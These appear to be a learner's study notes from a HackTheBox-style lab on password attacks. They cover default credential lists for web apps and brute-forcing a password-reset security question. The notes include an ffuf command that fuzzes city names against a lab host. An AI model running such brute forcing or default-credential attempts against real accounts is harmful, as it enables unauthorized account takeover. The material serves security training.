# 👩‍🦰 Password Attacks

## Default Credentials

Many web applications are set up with default credentials to allow accessing it after installation. However, these credentials need to be changed after the initial setup of the web application

Here are lists of default credentials for a wide variety of web applications: [CIRT.net](https://www.cirt.net/passwords) also [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub

let's imagine the following web app:

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

We can spot it's a bookstack web app, we can then go and see if we can't find some default creds online ->

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Vulnerable Password Reset

### Guessable Password Reset

We could imagine questions like the following:

* "`What is your mother's maiden name?`"
* "`What city were you born in?`"

Then it's on us to chase for the good wordlist such as [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world.

```shell-session
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
wc -l city_wordlist.txt 
```

so let's imagine after entering our username wer got asked a question, it would look like this:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

and now it's on us to craft a payload:

```shell-session
ElFelixi0@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

and then we can reset password
